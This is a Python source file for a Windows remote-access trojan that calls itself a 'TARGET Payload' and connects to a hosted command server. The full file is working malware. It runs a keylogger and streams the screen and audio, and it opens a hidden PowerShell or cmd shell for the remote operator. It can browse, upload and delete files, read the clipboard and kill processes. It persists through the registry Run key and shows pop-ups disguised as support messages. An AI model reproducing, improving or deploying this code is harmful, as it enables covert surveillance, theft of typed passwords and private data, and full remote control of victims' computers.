import os
import sys
import cv2
import numpy as np
import pyautogui
import mss
import base64
import json
import subprocess
import threading
import time
import queue
import winreg
import ctypes
import psutil
import pyperclip
import socketio
from datetime import datetime
from PIL import Image

try:
    import sounddevice as sd
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    print("[WARN] sounddevice not installed — audio streaming disabled")

try:
    from pynput import keyboard as pynput_keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("[WARN] pynput not installed — keylogger disabled")

try:
    import GPUtil
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

# ============================================================
#  Config & Globals
# ============================================================
SERVER_URL = "https://room-6060.onrender.com"  # Change to http://localhost:8080 for local testing

sio = socketio.Client(logger=False, engineio_logger=False)

sct = mss.mss()
screen_size = None
webcam = None
is_capturing = False
current_monitor = 1

terminal_processes = {}
audio_stream = None
audio_thread = None
is_audio_streaming = False
vitals_active = False

keylog_data = []
keylog_listener = None
keylog_lock = threading.Lock()
KEYLOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keylog.json')
chat_history = []

# ============================================================
#  Mouse & Keyboard Controllers
# ============================================================
class MouseController:
    @staticmethod
    def move(x, y): pyautogui.moveTo(x, y)
    @staticmethod
    def click(button='left'): pyautogui.click(button=button)
    @staticmethod
    def double_click(): pyautogui.doubleClick()
    @staticmethod
    def right_click(): pyautogui.rightClick()
    @staticmethod
    def scroll(amount): pyautogui.scroll(amount)
    @staticmethod
    def drag(x1, y1, x2, y2): pyautogui.moveTo(x1, y1); pyautogui.dragTo(x2, y2, duration=0)

class KeyboardController:
    @staticmethod
    def press(key): pyautogui.press(key)
    @staticmethod
    def typewrite(text, interval=0.01): pyautogui.typewrite(text, interval)
    @staticmethod
    def hotkey(*args): pyautogui.hotkey(*args)

# ============================================================
#  Capture Loops
# ============================================================
def get_screen():
    monitor = sct.monitors[current_monitor]
    raw_img = sct.grab(monitor)
    img = Image.frombytes("RGB", raw_img.size, raw_img.rgb)
    return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

def screen_capture_loop():
    global screen_size, is_capturing
    screen_size = sct.monitors[current_monitor]
    while is_capturing:
        try:
            frame = get_screen()
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
            result, encimg = cv2.imencode('.jpg', frame, encode_param)
            if result:
                sio.emit('screen_frame', {
                    'image': base64.b64encode(encimg).decode('utf-8'),
                    'width': screen_size['width'],
                    'height': screen_size['height'],
                    'timestamp': time.time()
                })
            time.sleep(1/30)
        except Exception as e:
            print(f"Capture error: {e}")
            time.sleep(0.1)

# ============================================================
#  Incoming Server Events (Admin -> Target)
# ============================================================
@sio.event
def connect():
    print(f"✅ Connected to Master Server: {SERVER_URL}")
    sio.emit('register', {'role': 'target'})
    
    # Initialize capturing
    global is_capturing
    is_capturing = True
    sio.emit('init', {
        'screen_size': sct.monitors[current_monitor],
        'status': 'online',
        'audio_available': AUDIO_AVAILABLE,
        'keylogger_available': KEYLOGGER_AVAILABLE,
        'gpu_available': GPU_AVAILABLE,
        'monitors': len(sct.monitors) - 1
    })
    
    threading.Thread(target=screen_capture_loop, daemon=True).start()

@sio.event
def disconnect():
    print("❌ Disconnected from Master Server")
    global is_capturing
    is_capturing = False

@sio.on('mouse')
def on_mouse(data):
    if data['type'] == 'move': MouseController.move(data['x'], data['y'])
    elif data['type'] == 'click': MouseController.click(data.get('button', 'left'))
    elif data['type'] == 'dblclick': MouseController.double_click()
    elif data['type'] == 'rightclick': MouseController.right_click()
    elif data['type'] == 'scroll': MouseController.scroll(data.get('amount', 0))
    elif data['type'] == 'drag': MouseController.drag(data['x1'], data['y1'], data['x2'], data['y2'])

@sio.on('keyboard')
def on_keyboard(data):
    if data['type'] == 'press': KeyboardController.press(data['key'])
    elif data['type'] == 'type': threading.Thread(target=KeyboardController.typewrite, args=(data['text'],), daemon=True).start()
    elif data['type'] == 'hotkey': KeyboardController.hotkey(*data['keys'])

@sio.on('system')
def on_system(data):
    if data['cmd'] == 'screenshot':
        frame = get_screen()
        _, buffer = cv2.imencode('.png', frame)
        sio.emit('screenshot', {'image': base64.b64encode(buffer).decode()})

# --- Terminal ---
@sio.on('terminal_start')
def on_terminal_start(data):
    shell = data.get('shell', 'powershell')
    shell_cmd = 'powershell.exe' if shell == 'powershell' else 'cmd.exe'
    try:
        proc = subprocess.Popen(shell_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NO_WINDOW, bufsize=0)
        terminal_processes['main'] = proc
        def read_output():
            while proc.poll() is None:
                try:
                    chunk = proc.stdout.read(4096)
                    if chunk: sio.emit('terminal_output', {'output': chunk.decode('utf-8', errors='replace')})
                except: break
            sio.emit('terminal_output', {'output': '\r\n[Process exited]\r\n'})
        threading.Thread(target=read_output, daemon=True).start()
        sio.emit('terminal_started', {'shell': shell})
    except Exception as e:
        sio.emit('terminal_output', {'output': f'Error starting terminal: {e}\r\n'})

@sio.on('terminal_input')
def on_terminal_input(data):
    if 'main' in terminal_processes:
        proc = terminal_processes['main']
        if proc.poll() is None:
            try: proc.stdin.write((data['input'] + '\n').encode('utf-8')); proc.stdin.flush()
            except: pass

@sio.on('terminal_stop')
def on_terminal_stop(data):
    if 'main' in terminal_processes:
        try: terminal_processes['main'].terminate()
        except: pass
        del terminal_processes['main']

# --- Vitals ---
@sio.on('vitals_start')
def on_vitals_start(data):
    global vitals_active
    vitals_active = True
    def send_vitals():
        while vitals_active:
            try:
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                net = psutil.net_io_counters()
                vitals = {
                    'cpu': psutil.cpu_percent(interval=0),
                    'cpu_cores': psutil.cpu_percent(percpu=True),
                    'ram_used': round(mem.used / 1024 / 1024 / 1024, 2),
                    'ram_total': round(mem.total / 1024 / 1024 / 1024, 2),
                    'ram_percent': mem.percent,
                    'disk_used': round(disk.used / 1024 / 1024 / 1024, 1),
                    'disk_total': round(disk.total / 1024 / 1024 / 1024, 1),
                    'disk_percent': disk.percent,
                    'net_sent': round(net.bytes_sent / 1024 / 1024, 1),
                    'net_recv': round(net.bytes_recv / 1024 / 1024, 1),
                    'timestamp': time.time()
                }
                if GPU_AVAILABLE:
                    try:
                        gpus = GPUtil.getGPUs()
                        if gpus:
                            gpu = gpus[0]
                            vitals.update({'gpu_name': gpu.name, 'gpu_load': round(gpu.load * 100, 1), 'gpu_temp': gpu.temperature, 'gpu_mem_used': round(gpu.memoryUsed, 1), 'gpu_mem_total': round(gpu.memoryTotal, 1)})
                    except: pass
                sio.emit('vitals_update', vitals)
            except Exception as e: print(f"Vitals error: {e}")
            time.sleep(1)
    threading.Thread(target=send_vitals, daemon=True).start()

@sio.on('vitals_stop')
def on_vitals_stop(data):
    global vitals_active
    vitals_active = False

# --- Audio ---
@sio.on('audio_start')
def on_audio_start(data):
    global is_audio_streaming, audio_stream
    if not AUDIO_AVAILABLE or is_audio_streaming: return
    source = data.get('source', 'mic')
    is_audio_streaming = True
    def stream_audio():
        global is_audio_streaming, audio_stream
        try:
            device_index = None
            if source == 'system':
                devices = sd.query_devices()
                for i, dev in enumerate(devices):
                    if ('loopback' in dev['name'].lower() or 'stereo mix' in dev['name'].lower()) and dev['max_input_channels'] > 0:
                        device_index = i; break
            sample_rate = 16000
            def audio_callback(indata, frames, time_info, status):
                if not is_audio_streaming: return
                audio_int16 = (indata[:, 0] * 32767).astype(np.int16)
                sio.emit('audio_chunk', {'data': base64.b64encode(audio_int16.tobytes()).decode('utf-8'), 'sample_rate': sample_rate, 'channels': 1})
            audio_stream = sd.InputStream(samplerate=sample_rate, blocksize=1024, channels=1, dtype='float32', device=device_index, callback=audio_callback)
            audio_stream.start()
            while is_audio_streaming: time.sleep(0.1)
            audio_stream.stop(); audio_stream.close()
        except Exception as e:
            sio.emit('audio_error', {'error': str(e)})
            is_audio_streaming = False
    threading.Thread(target=stream_audio, daemon=True).start()
    sio.emit('audio_started', {'source': source})

@sio.on('audio_stop')
def on_audio_stop(data):
    global is_audio_streaming
    is_audio_streaming = False
    sio.emit('audio_stopped', {})

# --- Process Manager ---
@sio.on('process_list')
def on_process_list(data):
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status', 'username']):
        try:
            info = proc.info
            processes.append({
                'pid': info['pid'], 'name': info['name'], 'cpu': round(info['cpu_percent'] or 0, 1),
                'ram': round((info['memory_info'].rss / 1024 / 1024) if info['memory_info'] else 0, 1), 'status': info['status'], 'user': info['username'] or 'SYSTEM'
            })
        except: pass
    processes.sort(key=lambda x: x['cpu'], reverse=True)
    sio.emit('process_data', {'processes': processes[:200]})

@sio.on('process_kill')
def on_process_kill(data):
    try:
        pid = data['pid']; proc = psutil.Process(pid); proc.terminate()
        sio.emit('process_kill_status', {'success': True, 'pid': pid})
    except Exception as e: sio.emit('process_kill_status', {'success': False, 'error': str(e)})

# --- Files ---
@sio.on('file_browse')
def on_file_browse(data):
    path = data.get('path', os.path.expanduser('~'))
    try:
        entries = []
        for entry in os.scandir(path):
            try:
                stat = entry.stat()
                entries.append({'name': entry.name, 'path': entry.path.replace('\\', '/'), 'is_dir': entry.is_dir(), 'size': stat.st_size if not entry.is_dir() else 0, 'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')})
            except:
                entries.append({'name': entry.name, 'path': entry.path.replace('\\', '/'), 'is_dir': entry.is_dir(), 'size': 0, 'modified': '', 'error': 'Access denied'})
        entries.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        sio.emit('file_list', {'path': path.replace('\\', '/'), 'parent': os.path.dirname(path).replace('\\', '/'), 'entries': entries})
    except Exception as e: sio.emit('file_list', {'error': str(e)})

@sio.on('file_upload')
def on_file_upload(data):
    try:
        path = data['path']; content = base64.b64decode(data['content'])
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f: f.write(content)
        sio.emit('file_upload_status', {'success': True, 'path': path})
    except Exception as e: sio.emit('file_upload_status', {'success': False, 'error': str(e)})

@sio.on('file_delete')
def on_file_delete(data):
    try:
        path = data['path']
        if os.path.isfile(path): os.remove(path)
        elif os.path.isdir(path): import shutil; shutil.rmtree(path)
        sio.emit('file_delete_status', {'success': True, 'path': path})
    except Exception as e: sio.emit('file_delete_status', {'success': False, 'error': str(e)})

# --- Keylogger ---
def start_keylogger():
    global keylog_listener, keylog_data
    if not KEYLOGGER_AVAILABLE: return
    if os.path.exists(KEYLOG_FILE):
        try:
            with open(KEYLOG_FILE, 'r') as f: keylog_data = json.load(f)
        except: keylog_data = []
    def on_press(key):
        key_str = key.char if hasattr(key, 'char') and key.char else str(key).replace('Key.', '')
        entry = {'key': key_str, 'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3], 'timestamp': time.time()}
        with keylog_lock:
            keylog_data.append(entry)
            if len(keylog_data) % 50 == 0:
                try:
                    with open(KEYLOG_FILE, 'w') as f: json.dump(keylog_data, f)
                except: pass
    keylog_listener = pynput_keyboard.Listener(on_press=on_press)
    keylog_listener.daemon = True; keylog_listener.start()

@sio.on('keylog_fetch')
def on_keylog_fetch(data=None):
    search = data.get('search', '') if data else ''
    with keylog_lock:
        filtered = [e for e in keylog_data if search.lower() in e['key'].lower()] if search else keylog_data[-500:]
    sio.emit('keylog_data', {'entries': filtered, 'total': len(keylog_data)})

@sio.on('keylog_clear')
def on_keylog_clear(data):
    global keylog_data
    with keylog_lock: keylog_data = []; 
    try:
        with open(KEYLOG_FILE, 'w') as f: json.dump(keylog_data, f)
    except: pass
    sio.emit('keylog_cleared', {})

# --- Monitors ---
@sio.on('monitor_list')
def on_monitor_list(data):
    monitors = [{'index': i, 'width': m['width'], 'height': m['height'], 'left': m['left'], 'top': m['top'], 'primary': i == 1} for i, m in enumerate(sct.monitors) if i > 0]
    sio.emit('monitor_data', {'monitors': monitors, 'current': current_monitor})

@sio.on('monitor_switch')
def on_monitor_switch(data):
    global current_monitor, screen_size
    idx = data.get('index', 1)
    if 1 <= idx < len(sct.monitors):
        current_monitor = idx; screen_size = sct.monitors[current_monitor]
        sio.emit('monitor_switched', {'index': idx, 'size': screen_size})

# --- Clipboard ---
@sio.on('clipboard_get')
def on_clipboard_get(data):
    try: sio.emit('clipboard_content', {'content': pyperclip.paste()})
    except Exception as e: sio.emit('clipboard_content', {'error': str(e)})

@sio.on('clipboard_set')
def on_clipboard_set(data):
    try: pyperclip.copy(data['content']); sio.emit('clipboard_status', {'success': True})
    except Exception as e: sio.emit('clipboard_status', {'success': False, 'error': str(e)})

# --- Chat & Alerts ---
@sio.on('chat_send')
def on_chat_send(data):
    message = data.get('message', '')
    msg_entry = {'from': 'admin', 'message': message, 'time': datetime.now().strftime('%H:%M:%S')}
    chat_history.append(msg_entry)
    def show_popup():
        try: ctypes.windll.user32.MessageBoxW(0, message, "💬 Support Message", 0x00000040 | 0x00001000)
        except: pass
    threading.Thread(target=show_popup, daemon=True).start()
    sio.emit('chat_received', msg_entry)

@sio.on('chat_history')
def on_chat_history(data):
    sio.emit('chat_data', {'messages': chat_history})

@sio.on('alert_send')
def on_alert_send(data):
    title = data.get('title', 'System Alert')
    message = data.get('message', '')
    icon = data.get('icon', 'info')
    icon_flags = {'info': 0x00000040, 'warning': 0x00000030, 'error': 0x00000010}
    def show_alert():
        try: ctypes.windll.user32.MessageBoxW(0, message, title, icon_flags.get(icon, 0x00000040) | 0x00001000)
        except: pass
    threading.Thread(target=show_alert, daemon=True).start()
    sio.emit('alert_sent', {'success': True})

# ============================================================
#  Main Startup
# ============================================================
def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        python_exe = sys.executable.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath(__file__)
        command = f'"{python_exe}" "{script_path}"'
        winreg.SetValueEx(open_key, "ControlRoomElite", 0, winreg.REG_SZ, command)
        winreg.CloseKey(open_key)
    except: pass

if __name__ == '__main__':
    pyautogui.FAILSAFE = False
    start_keylogger()
    add_to_startup()
    
    print("=" * 60)
    print(f"  🔥 CONTROL ROOM CLIENT TARGET Payload")
    print(f"  📡 Connecting to {SERVER_URL}...")
    print("=" * 60)
    
    while True:
        try:
            sio.connect(SERVER_URL)
            sio.wait()
        except socketio.exceptions.ConnectionError:
            print("Connection failed, retrying in 5s...")
            time.sleep(5)
